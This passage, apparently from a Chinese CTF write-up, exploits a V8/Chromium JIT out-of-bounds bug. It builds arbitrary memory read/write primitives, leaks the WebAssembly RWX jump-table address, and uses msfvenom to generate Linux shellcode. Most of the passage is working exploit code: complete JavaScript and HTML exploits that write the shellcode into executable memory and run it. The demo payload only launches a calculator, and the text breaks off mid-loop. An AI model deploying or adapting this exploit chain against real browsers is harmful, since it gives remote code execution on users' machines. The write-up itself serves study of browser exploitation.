<li>我们可以很容易的推测出，那些 **JSTypedArray 读写的都是 ArrayBuffer 的 backing_store**，因此如果我们可以任意修改 ArrayBuffer 的 backing_store，那么就可以通过 JSTypedArray 进行任意地址读写。<br><blockquote>JSTypedArray 包括但不限于 DataView、Int32Array、Int64Array、Float32Array、Float64Array 等等。</blockquote>
笔者将在下面使用`DataView`对象来对 ArrayBuffer 的 backing_store 进行读写。为了证明 DataView 修改的确实是 ArrayBuffer 中 backing_store 指向的那块堆内存，笔者找到其对应的代码：
<blockquote>
注：以下代码来自`v8/src/builtins/data-view.tq`，代码语言为V8 `Torque`。该语言的语法类似于`TypeScript`，其设计目的在于更方便的表示高级的、语义丰富的V8实现。Torque编译器使用CodeStubAssembler将这些片断转换为高效的汇编代码。
更多关于该语言的信息请查阅 [V8 Torque user manual](https://v8.dev/docs/torque)。
</blockquote>
<pre><code class="lang-js hljs javascript">// v8/src/builtins/data-view.tq
javascript builtin DataViewPrototypeSetFloat64(
    context: Context, receiver: Object, ...arguments): Object `{`
      let offset: Object = arguments.length &gt; 0 ?
          arguments[0] :
          Undefined;
      let value : Object = arguments.length &gt; 1 ?
          arguments[1] :
          Undefined;
      let is_little_endian : Object = arguments.length &gt; 2 ?
          arguments[2] :
          Undefined;
      // 在越界检查完成后，继续调用 DataViewSet函数。
      return DataViewSet(context, receiver, offset, value,
                         is_little_endian, FLOAT64_ELEMENTS);
    `}`
macro DataViewSet(context: Context,
                    receiver: Object,
                    offset: Object,
                    value: Object,
                    requested_little_endian: Object,
                    kind: constexpr ElementsKind): Object `{`
    // 获取当前 DataView 类型
    let data_view: JSDataView = ValidateDataView(
        context, receiver, MakeDataViewSetterNameString(kind));
    // ...
    let littleEndian: bool = ToBoolean(requested_little_endian);
    // 获取当前 DataView 中的 Buffer，即对应的 ArrayBuffer
    let buffer: JSArrayBuffer = data_view.buffer;
    // ...
    else `{`
      let double_value: float64 = ChangeNumberToFloat64(num_value);

      if constexpr (kind == UINT8_ELEMENTS || kind == INT8_ELEMENTS) `{`
         // ...
      `}`
      // ...
      else if constexpr (kind == FLOAT64_ELEMENTS) `{`
      // 将一个64位值分解成两个32位值并写入Buffer.
        let low_word: uint32 = Float64ExtractLowWord32(double_value);
        let high_word: uint32 = Float64ExtractHighWord32(double_value);
        StoreDataView64(buffer, bufferIndex, low_word, high_word,
                        littleEndian);
      `}`
    `}`
    return Undefined;
  `}`
macro StoreDataView64(buffer: JSArrayBuffer, offset: intptr,
                        low_word: uint32, high_word: uint32,
                        requested_little_endian: bool) `{`
    // 获取写入的内存地址，这里取的是 ArrayBuffer 中的 backing_store 
    // 可以看到这个结果与我们的预计是一致的。
    let data_pointer: RawPtr = buffer.backing_store;
    // ...
    if (requested_little_endian) `{`
      // 将值写入 backing_store。
      StoreWord8(data_pointer, offset, b0);
      StoreWord8(data_pointer, offset + 1, b1);
      StoreWord8(data_pointer, offset + 2, b2);
      StoreWord8(data_pointer, offset + 3, b3);
      StoreWord8(data_pointer, offset + 4, b4);
      StoreWord8(data_pointer, offset + 5, b5);
      StoreWord8(data_pointer, offset + 6, b6);
      StoreWord8(data_pointer, offset + 7, b7);
    `}` else `{`
        // ...
    `}`
  `}`
</code></pre>
</li>
- 因此，现在我们可以试着构建任意地址读写原语
> 注：以下代码来自`v8/src/builtins/data-view.tq`，代码语言为V8 `Torque`。该语言的语法类似于`TypeScript`，其设计目的在于更方便的表示高级的、语义丰富的V8实现。Torque编译器使用CodeStubAssembler将这些片断转换为高效的汇编代码。
更多关于该语言的信息请查阅 [V8 Torque user manual](https://v8.dev/docs/torque)。

##### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="3)%20%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99%E5%8E%9F%E8%AF%AD"></a>3) 任意地址读写原语
<li>根据上面的分析，我们可以梳理一条这样的过程来构造任意地址读写原语：
<ul>
- 通过 OOB 修改其自身 JSArray 的 length，从而达到大范围越界读写。
- 试着**将 ArrayBuffer 分配到与 OOB 的 JSArray 相同的内存段上**，这样就可以通过 OOB 来修改 ArrayBuffer 的 backing_store。
- 将 ArrayBuffer 与 DataView 对象关联，这样就可以在 JSArray 越界修改 ArrayBuffer 的 backing_store 后，通过DataView 对象读写目标内存。
```
// v8/src/code-stub-assembler.cc

// in TNode&lt;Float64T&gt; CodeStubAssembler::LoadFixedDoubleArrayElement
CSA_ASSERT(this, IsOffsetInBounds(
    offset, LoadAndUntagFixedArrayBaseLength(object),
    FixedDoubleArray::kHeaderSize, HOLEY_DOUBLE_ELEMENTS));
```

由于`CSA_ASSERT`只会在Debug版本下的 v8 生效，因此我们同样可以注释掉该语句再重新编译，不影响 chromium 中 exp 的编写。

```
function log(msg)
`{`
    console.log(msg);
    // var elem = document.getElementById("#log");
    // elem.innerText += '[+] ' + msg + '\n';
`}`

/******* -- 64位整数 与 64位浮点数相互转换的原语 -- *******/

var transformBuffer = new ArrayBuffer(8);
var bigIntArray = new BigInt64Array(transformBuffer);
var floatArray = new Float64Array(transformBuffer);
function Int64ToFloat64(int)
`{`
    bigIntArray[0] = BigInt(int);
    return floatArray[0];
`}`
function Float64ToInt64(float)
`{`
    floatArray[0] = float;
    return bigIntArray[0];
`}`

/******* -- 修改JSArray length 的操作 -- *******/
var oob_arr = [];
function opt_me(x)
`{`
    oob_arr = [1.0, 1.1, 1.2, 1.3, 1.4, 1.5, 1.6];
    let t = (x == 1 ? 9007199254740992 : 9007199254740989);
    t = t + 1 + 1;
    t -= 9007199254740990;
    t *= 2;
    t += 2;
    oob_arr[t] = 2.1729236899484389e-311; // 1024.f2smi
`}`
// 试着触发 turboFan，从而修改 JSArray 的 length
for(let i = 0; i &lt; 0x10000; i++)
    opt_me(1);
// 简单 checker
if(oob_arr[1023] == undefined)
    throw "OOB Fail!";
else
    log("[+] oob_arr.length == " + oob_arr.length);

/******* -- 任意地址读写原语 -- *******/
var array_buffer;
array_buffer = new ArrayBuffer(0x233);
data_view = new DataView(array_buffer);
backing_store_offset = -1;

// 确定backing_store_offset
for(let i = 0; i &lt; 0x400; i++)
`{`   
    // smi(0x233) == 0x0000023300000000
    if(Float64ToInt64(oob_arr[i]) == 0x0000023300000000)
    `{`
        backing_store_offset = i + 1;
        break;
    `}`
`}`
// 简单确认一下是否成功找到 backing_store
if(backing_store_offset == -1)
    throw "backing_store is not found!";
else
    log("[+] backing_store offset: " + backing_store_offset);

function read_8bytes(addr)
`{`
    oob_arr[backing_store_offset] = Int64ToFloat64(addr);
    return data_view.getBigInt64(0, true); // true 设置小端序
`}`
function write_8bytes(addr, data)
`{`
    oob_arr[backing_store_offset] = Int64ToFloat64(addr);
    data_view.setBigInt64(0, BigInt(data), true); // true 设置小端序
`}`

/******* -- try arbitrary read/write -- *******/
// 试着读取地址为 0xdeaddead 的内存
read_8bytes(0xdeaddead);
// 试着写入地址为 0xdeaddead 的内存
write_8bytes(0xdeaddead, 0x89abcdef);
```

测试结果如下：

> 注：单次只能测试任意读或任意写，不能同时测试。
<li>可以将目标数据写入目标地址：[![](https://p3.ssl.qhimg.com/t0105286ece9f8f328b.png)](https://p3.ssl.qhimg.com/t0105286ece9f8f328b.png)
</li>
<li>可以从目标地址中读出数据[![](https://p3.ssl.qhimg.com/t01e1c712411c2e9da6.png)](https://p3.ssl.qhimg.com/t01e1c712411c2e9da6.png)
</li>
#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="c.%20%E6%B3%84%E9%9C%B2%20RWX%20%E5%9C%B0%E5%9D%80"></a>c. 泄露 RWX 地址
<li>由于 v8 已经[取消](https://source.chromium.org/chromium/v8/v8.git/+/dde25872f58951bb0148cf43d6a504ab2f280485:src/flag-definitions.h;l=717)将 **JIT 编码的 JSFunction** 放入 RWX 内存中 ，因此我们必须另找它法。根据所搜索到的利用方式，有以下两种：
<ol>
<li>将 Array 的 JSFunction 写入内存并泄露，之后就可以进一步泄露 JSFunction 中的 code 指针。由于这个Code指针指向 chromium 二进制文件内部，因此我们可以将二进制文件拖入 IDA 中计算相对位移，获取 **代码基地址 =&gt; GOT表条目 =&gt; libc基地址 =&gt; enviroment指针**，这样就可以获取到可写的栈地址以及`mprotect`地址。然后将 shellcode 写入栈里并 ROP 调用 mprotect 修改执行权限，最后跳转执行，这样就可以成功执行 shellcode。<br><blockquote>此方法来自 Sakura 师傅，第四条参考链接。</blockquote>
</li>
<li>v8 除了编译 JS 以外还编译 WebAssembly （wasm）代码，而 wasm 模块至今仍然[使用](https://source.chromium.org/chromium/chromium/src/+/1bc5adc2c0e057fb0fb91afa0c534dada924f90e:v8/src/flags/flag-definitions.h;l=790) RWX 内存，因此我们可以试着将 shellcode 写入这块内存中并执行，不过这个方法有点折腾。<br><blockquote>此方法来自 doar-e，第一条参考链接。</blockquote>
</li>
</ol>
第一种利用方式非常的直接，利用起来应该没有太大的难度。因此出于学习的目的，我们选择第二种方式，学习一下 WebAssembly 的利用方式。
</li>
<li>通过查阅这片文章 [浅谈如何逆向分析WebAssembly二进制文件 – 安全客](https://www.anquanke.com/post/id/150923)，我们可以获取到wasm的简易使用方式，并通过这个方式获取到 Wasm 的 JSFunction：
<pre><code class="lang-js hljs javascript">// C++ 代码 `void func() `{``}`` 的 wasm 二进制代码
let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,132,128,128,128,0,1,96,0,0,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,102,117,110,99,0,0,10,136,128,128,128,0,1,130,128,128,128,0,0,11]);
let m = new WebAssembly.Instance(new WebAssembly.Module(wasmCode),`{``}`);
var WasmJSFunction = m.exports.func;
</code></pre>
</li>
<li>而对于一个 Wasm 的 JSFunction，我们可以通过以下路径来获取 RWX 段地址：<br><blockquote>这条路径稍微有点长：JSFunction -&gt; SharedFunctionInfo -&gt; WasmExportedFunctionData -&gt; WasmInstanceObject -&gt; JumpTableStart。</blockquote>
<ul>
<li>从 JSFunction 出发，获取其 SharedFunctionInfo（相对偏移为 0x18）[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01121bd282a155afda.png)
</li>
<li>之后从 SharedFunctionInfo 获取其 WasmExportedFunctionData（相对偏移为 0x8）[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f0d224f3af56cc3c.png)
</li>
<li>再从 WasmExportedFunctionData 中获取 WasmInstanceObject（相对偏移为 0x10）[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011b8895b2bcfc890f.png)
</li>
<li>最后从 WasmInstanceObject 中获取 JumpTableStart（相对偏移为 0xe8）[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01123df0635c3ef7ae.png)
</li>
```
// C++ 代码 `void func() `{``}`` 的 wasm 二进制代码
let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,132,128,128,128,
    0,1,96,0,0,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,
    131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,
    6,109,101,109,111,114,121,2,0,4,102,117,110,99,0,0,10,136,128,128,128,
    0,1,130,128,128,128,0,0,11]);
let m = new WebAssembly.Instance(new WebAssembly.Module(wasmCode),`{``}`);
var WasmJSFunction = m.exports.func;
// 输出一下 Wasm JSFunction 地址，并获取其 JumpTableStart
%DebugPrint(WasmJSFunction);
// 之后在 gdb 中给 JumpTableStart 下个断点
%SystemBreak();
// 尝试执行 Wasm JSFunction
WasmJSFunction();
%SystemBreak();
```

```
function prettyHex(bigint)
`{`
  return "0x" + BigInt.asUintN(64,bigint).toString(16).padStart(16, '0');
`}`

// C++ 代码 `void func() `{``}`` 的 wasm 二进制代码
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,132,128,128,128,
    0,1,96,0,0,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,
    131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,
    6,109,101,109,111,114,121,2,0,4,102,117,110,99,0,0,10,136,128,128,128,
    0,1,130,128,128,128,0,0,11]);
var m = new WebAssembly.Instance(new WebAssembly.Module(wasmCode),`{``}`);
var WasmJSFunction = m.exports.func;
// 将WasmJSFunction 布置到与 oob_arr 数组相同的内存段上
// 这里写入了一个哨兵值0x233333，用于查找 WasmJSFunction 地址
var WasmJSFunctionObj = `{`guard: Int64ToFloat64(0x233333), wasmAddr: WasmJSFunction`}`;
var WasmJSFunctionIndex = -1;

for(let i = 0; i &lt; 0x4000; i++)
`{`   
    // 查找哨兵值
    if(Float64ToInt64(oob_arr[i]) == 0x233333)
    `{`
        WasmJSFunctionIndex = i + 1;
        break;
    `}`
`}`

// 简单确认一下是否成功找到 WasmJSFunctionAddr
if(WasmJSFunctionIndex == -1)
    throw "WasmJSFunctionAddr is not found!";
else
    log("[+] find WasmJSFunctionAddr offset: " + WasmJSFunctionIndex);

// 获取 WasmJSFunction 地址
WasmJSFunctionAddr = Float64ToInt64(oob_arr[WasmJSFunctionIndex]) - BigInt(1);
log("[+] find WasmJSFunction address: " + prettyHex(WasmJSFunctionAddr));
// 获取 SharedFunctionInfo 地址
SharedFunctionInfoAddr = read_8bytes(WasmJSFunctionAddr + BigInt(0x18)) - BigInt(1);
log("[+] find SharedFunctionInfoAddr address: " + prettyHex(SharedFunctionInfoAddr));
// 获取 WasmExportedFunctionData 地址
WasmExportedFunctionDataAddr = read_8bytes(SharedFunctionInfoAddr + BigInt(0x8)) - BigInt(1);
log("[+] find WasmExportedFunctionDataAddr address: " + prettyHex(WasmExportedFunctionDataAddr));
// 获取 WasmInstanceObject 地址
WasmInstanceObjectAddr = read_8bytes(WasmExportedFunctionDataAddr + BigInt(0x10)) - BigInt(1);
log("[+] find WasmInstanceObjectAddr address: " + prettyHex(WasmInstanceObjectAddr));
// 获取 JumpTableStart 地址
JumpTableStartAddr = read_8bytes(WasmInstanceObjectAddr + BigInt(0xe8));
log("[+] find JumpTableStartAddr address: " + prettyHex(JumpTableStartAddr));
```

需要注意的是，在读取`WasmExportedFunctionDataAddr`时会触发 debug 的越界检查：

```
// v8/src/code-stub-assembler.cc
// in CodeStubAssembler::FixedArrayBoundsCheck
CSA_CHECK(this, UintPtrLessThan(effective_index,
                                  LoadAndUntagFixedArrayBaseLength(array)));
```

注释掉再重新编译即可。

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="d.%20shellcode"></a>d. shellcode

最后我们只要将 shellcode 写入该 RWX 地址处并调用 Wasm JSFunction 即可成功执行 shellcode。

使用 msfvenom 生成满足以下条件的 shellcode:
<li>payload为 `linux x64`
</li>
- 格式为 C语言
<li>命令为`DISPLAY=:0 gnome-calculator`
</li>
```
msfvenom -p linux/x64/exec CMD='DISPLAY=:0 gnome-calculator' -f c
```

输出如下：

```
Payload size: 67 bytes
Final size of c file: 307 bytes
unsigned char buf[] = 
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x1c\x00"
"\x00\x00\x44\x49\x53\x50\x4c\x41\x59\x3d\x3a\x30\x20\x67\x6e"
"\x6f\x6d\x65\x2d\x63\x61\x6c\x63\x75\x6c\x61\x74\x6f\x72\x00"
"\x56\x57\x48\x89\xe6\x0f\x05";
```

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="e.%20exploit"></a>e. exploit
<li>结合上面的内容，release 版本 v8 的 exp 如下：
<pre><code class="lang-js hljs javascript">function log(msg)
`{`
    console.log(msg);
    // var elem = document.getElementById("#log");
    // elem.innerText += '[+] ' + msg + '\n';
`}`

/******* -- 64位整数 与 64位浮点数相互转换的原语 -- *******/

var transformBuffer = new ArrayBuffer(8);
var bigIntArray = new BigInt64Array(transformBuffer);
var floatArray = new Float64Array(transformBuffer);
function Int64ToFloat64(int)
`{`
    bigIntArray[0] = BigInt(int);
    return floatArray[0];
`}`
function Float64ToInt64(float)
`{`
    floatArray[0] = float;
    return bigIntArray[0];
`}`

/******* -- 修改JSArray length 的操作 -- *******/
var oob_arr = [];
function opt_me(x)
`{`
    oob_arr = [1.0, 1.1, 1.2, 1.3, 1.4, 1.5, 1.6];
    let t = (x == 1 ? 9007199254740992 : 9007199254740989);
    t = t + 1 + 1;
    t -= 9007199254740990;
    t *= 2;
    t += 2;
    oob_arr[t] = 3.4766779039175022e-310; // 0x4000.f2smi
`}`
// 试着触发 turboFan，从而修改 JSArray 的 length
for(let i = 0; i &lt; 0x10000; i++)
    opt_me(1);
// 简单 checker
if(oob_arr[1023] == undefined)
    throw "OOB Fail!";
else
    log("[+] oob_arr.length == " + oob_arr.length);

/******* -- 任意地址读写原语 -- *******/

var array_buffer;
array_buffer = new ArrayBuffer(0x233);
data_view = new DataView(array_buffer);
backing_store_offset = -1;

// 确定backing_store_offset
for(let i = 0; i &lt; 0x4000; i++)
`{`   
    // smi(0x400) == 0x0000023300000000
    if(Float64ToInt64(oob_arr[i]) == 0x0000023300000000)
    `{`
        backing_store_offset = i + 1;
        break;
    `}`
`}`
// 简单确认一下是否成功找到 backing_store
if(backing_store_offset == -1)
    throw "backing_store is not found!";
else
    log("[+] find backing_store offset: " + backing_store_offset);

function read_8bytes(addr)
`{`
    oob_arr[backing_store_offset] = Int64ToFloat64(addr);
    return data_view.getBigInt64(0, true);
`}`
function write_8bytes(addr, data)
`{`
    oob_arr[backing_store_offset] = Int64ToFloat64(addr);
    data_view.setBigInt64(0, BigInt(data), true);
`}`

/******* -- 布置 wasm 地址以及获取 RWX 内存地址 -- *******/
function prettyHex(bigint)
`{`
    return "0x" + BigInt.asUintN(64,bigint).toString(16).padStart(16, '0');
`}`

// C++ 代码 `void func() `{``}`` 的 wasm 二进制代码
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,132,128,128,128,
    0,1,96,0,0,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,
    131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,
    6,109,101,109,111,114,121,2,0,4,102,117,110,99,0,0,10,136,128,128,128,
    0,1,130,128,128,128,0,0,11]);
var m = new WebAssembly.Instance(new WebAssembly.Module(wasmCode),`{``}`);
var WasmJSFunction = m.exports.func;
// 将WasmJSFunction 布置到与 oob_arr 数组相同的内存段上
// 这里写入了一个哨兵值0x233333，用于查找 WasmJSFunction 地址
var WasmJSFunctionObj = `{`guard: Int64ToFloat64(0x233333), wasmAddr: WasmJSFunction`}`;
var WasmJSFunctionIndex = -1;

for(let i = 0; i &lt; 0x4000; i++)
`{`   
    // 查找哨兵值
    if(Float64ToInt64(oob_arr[i]) == 0x233333)
    `{`
        WasmJSFunctionIndex = i + 1;
        break;
    `}`
`}`

// 简单确认一下是否成功找到 WasmJSFunctionAddr
if(WasmJSFunctionIndex == -1)
    throw "WasmJSFunctionAddr is not found!";
else
    log("[+] find WasmJSFunctionAddr offset: " + WasmJSFunctionIndex);

// 获取 WasmJSFunction 地址
WasmJSFunctionAddr = Float64ToInt64(oob_arr[WasmJSFunctionIndex]) - BigInt(1);
log("[+] find WasmJSFunction address: " + prettyHex(WasmJSFunctionAddr));
// 获取 SharedFunctionInfo 地址
SharedFunctionInfoAddr = read_8bytes(WasmJSFunctionAddr + BigInt(0x18)) - BigInt(1);
log("[+] find SharedFunctionInfoAddr address: " + prettyHex(SharedFunctionInfoAddr));
// 获取 WasmExportedFunctionData 地址
WasmExportedFunctionDataAddr = read_8bytes(SharedFunctionInfoAddr + BigInt(0x8)) - BigInt(1);
log("[+] find WasmExportedFunctionDataAddr address: " + prettyHex(WasmExportedFunctionDataAddr));
// 获取 WasmInstanceObject 地址
WasmInstanceObjectAddr = read_8bytes(WasmExportedFunctionDataAddr + BigInt(0x10)) - BigInt(1);
log("[+] find WasmInstanceObjectAddr address: " + prettyHex(WasmInstanceObjectAddr));
// 获取 JumpTableStart 地址
JumpTableStartAddr = read_8bytes(WasmInstanceObjectAddr + BigInt(0xe8));
log("[+] find JumpTableStartAddr address: " + prettyHex(JumpTableStartAddr));

/******* -- 写入并执行shell code -- *******/
var shellcode = new Uint8Array(
    [0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53,
     0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x1c, 0x00,
     0x00, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x20, 0x67, 0x6e,
     0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00,
     0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05]
);
// 写入shellcode 
log("[+] writing shellcode ... ");
// (尽管单次写入内存的数据大小为8bytes，但为了简便，一次只写入 1bytes 有效数据)
for(let i = 0; i &lt; shellcode.length; i++)
    write_8bytes(JumpTableStartAddr + BigInt(i), shellcode[i]);
// 执行shellcode
log("[+] execute calculator !");
WasmJSFunction();
</code></pre>
最终在 release 版下的 v8 可以成功调用 calculator：
[![](https://p1.ssl.qhimg.com/t013bb3ad17dfd29a1b.png)](https://p1.ssl.qhimg.com/t013bb3ad17dfd29a1b.png)
</li>
<li>但我们做题实际用到附件是一个带漏洞 v8 的 chromium。为了将 exploit 从 v8 移植到 chromium，其中**做了一点点微调**，因此最终的 exploit 如下：<br><blockquote>
这里主要调整了两个地方：
<ol>
<li>
**微调了内存布局。**<br>
将oob_arr、array_buffer以及WasmJSFunctionObj放的更近，使得内存布局的相对偏移不会太大。这样搜索哨兵值时就不用搜索太多次。</li>
<li>
**将两个搜索哨兵值的for循环合并成一个。**<br>
因为动态调试发现，当第二个for循环开始执行几十个循环后，原先存放 oob_array 以及 WasmJSFunctionObj 内存的数据将会被覆盖，**疑似**因为对象被过多访问而将其移动至另一个内存段上。这对我们泄露地址相当不利，因此合并两个for循环以降低搜索次数。</li>
</ol>
</blockquote>
<pre><code class="lang-html hljs xml">&lt;script&gt;
    /******* -- 64位整数 与 64位浮点数相互转换的原语 -- *******/
    var transformBuffer = new ArrayBuffer(8);
    var bigIntArray = new BigInt64Array(transformBuffer);
    var floatArray = new Float64Array(transformBuffer);
    function Int64ToFloat64(int) `{`
        bigIntArray[0] = BigInt(int);
        return floatArray[0];
    `}`
    function Float64ToInt64(float) `{`
        floatArray[0] = float;
        return bigIntArray[0];
    `}`

    /******* -- 修改JSArray length 的操作 -- *******/
    var oob_arr = [];

    function opt_me(x) `{`
        oob_arr = [1.0, 1.1, 1.2, 1.3, 1.4, 1.5, 1.6];
        let t = (x == 1 ? 9007199254740992 : 9007199254740989);
        t = t + 1 + 1;
        t -= 9007199254740990;
        t *= 2;
        t += 2;
        oob_arr[t] = 3.4766779039175022e-310; // 0x4000.f2smi
    `}`
    // 试着触发 turboFan，从而修改 JSArray 的 length
    for (let i = 0; i &lt; 0x10000; i++)
        opt_me(1);
    // 简单 checker
    if (oob_arr[1023] == undefined)
        throw "OOB Fail!";
    else
        console.log("[+] oob_arr.length == " + oob_arr.length);

    /******* -- 布置内存（使 oob_array、array_buffer 以及 WasmJSFunctionObj 相邻） -- *******/
    // 注意必须在执行完turboFan后开始布置

    var array_buffer;
    array_buffer = new ArrayBuffer(0x233);
    data_view = new DataView(array_buffer);
    backing_store_offset = -1;

    // C++ 代码 `void func() `{``}`` 的 wasm 二进制代码
    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 132, 128, 128, 128,
        0, 1, 96, 0, 0, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5,
        131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2,
        6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 102, 117, 110, 99, 0, 0, 10, 136, 128, 128, 128,
        0, 1, 130, 128, 128, 128, 0, 0, 11]);
    var m = new WebAssembly.Instance(new WebAssembly.Module(wasmCode), `{``}`);
    var WasmJSFunction = m.exports.func;
    // 将WasmJSFunction 布置到与 oob_arr 数组相同的内存段上
    // 这里写入了一个哨兵值0x233333，用于查找 WasmJSFunction 地址
    var WasmJSFunctionObj = `{` guard: Int64ToFloat64(0x233333), wasmAddr: WasmJSFunction `}`;
    var WasmJSFunctionIndex = -1;

    /******* -- 任意地址读写原语 -- *******/

    // 确定backing_store_offset 以及 WasmJSFunctionIndex
    // 只用一个for循环，只遍历一次
    for (let i = 0; i &lt; 0x4000; i++) `{`
        let val = Float64ToInt64(oob_arr[i]);
        // 开始查找哨兵值
        // 在查找array_buffer的backing_store时，注意DataView在Array_buffer高地址处
        // 查找哨兵值时有可能会查找到错误的位置，因此这里只取查找到的第一个地方
        if (backing_store_offset == -1 &amp;&amp; val == 0x0000023300000000) `{`
            backing_store_offset = i + 1;
            console.log("[+] find backing_store offset: " + backing_store_offset);
        `}`
        else if (WasmJSFunctionIndex == -1 &amp;&amp; val == 0x233333) `{`
            WasmJSFunctionIndex = i + 1;
            console.log("[+] find WasmJSFunctionAddr offset: " + WasmJSFunctionIndex);
        `}`
        // 如果都找到了就不用再找，以免碰上SIGMAP
        if (backing_store_offset != -1 &amp;&amp; WasmJSFunctionIndex != -1)
            break;
    `}`
    // 简单确认一下是否成功找到 backing_store
    if (backing_store_offset == -1)
        throw "backing_store is not found!";
    // 简单确认一下是否成功找到 WasmJSFunctionAddr
    else if (WasmJSFunctionIndex == -1)
        throw "WasmJSFunctionAddr is not found!";

    function read_8bytes(addr) `{`
        oob_arr[backing_store_offset] = Int64ToFloat64(addr);
        return data_view.getBigInt64(0, true);
    `}`
    function write_8bytes(addr, data) `{`
        oob_arr[backing_store_offset] = Int64ToFloat64(addr);
        data_view.setBigInt64(0, BigInt(data), true);
    `}`

    /******* -- 布置 wasm 地址以及获取 RWX 内存地址 -- *******/
    function prettyHex(bigint) `{`
        return "0x" + BigInt.asUintN(64, bigint).toString(16).padStart(16, '0');
    `}`

    // 获取 WasmJSFunction 地址
    WasmJSFunctionAddr = Float64ToInt64(oob_arr[WasmJSFunctionIndex]) - BigInt(1);
    console.log("[+] find WasmJSFunction address: " + prettyHex(WasmJSFunctionAddr));
    // 获取 SharedFunctionInfo 地址
    SharedFunctionInfoAddr = read_8bytes(WasmJSFunctionAddr + BigInt(0x18)) - BigInt(1);
    console.log("[+] find SharedFunctionInfoAddr address: " + prettyHex(SharedFunctionInfoAddr));
    // 获取 WasmExportedFunctionData 地址
    WasmExportedFunctionDataAddr = read_8bytes(SharedFunctionInfoAddr + BigInt(0x8)) - BigInt(1);
    console.log("[+] find WasmExportedFunctionDataAddr address: " + prettyHex(WasmExportedFunctionDataAddr));
    // 获取 WasmInstanceObject 地址
    WasmInstanceObjectAddr = read_8bytes(WasmExportedFunctionDataAddr + BigInt(0x10)) - BigInt(1);
    console.log("[+] find WasmInstanceObjectAddr address: " + prettyHex(WasmInstanceObjectAddr));
    // 获取 JumpTableStart 地址
    JumpTableStartAddr = read_8bytes(WasmInstanceObjectAddr + BigInt(0xe8));
    console.log("[+] find JumpTableStartAddr address: " + prettyHex(JumpTableStartAddr));

    /******* -- 写入并执行shell code -- *******/
    var shellcode = new Uint8Array(
        [0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53,
            0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x1c, 0x00,
            0x00, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x20, 0x67, 0x6e,
            0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00,
            0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05]
    );
    // 写入shellcode 
    console.log("[+] writing shellcode ... ");
    // (尽管单次写入内存的数据大小为8bytes，但为了简便，一次只写入 1bytes 有效数据)
    for (let i = 0; i &lt; shellcode.length; i++)
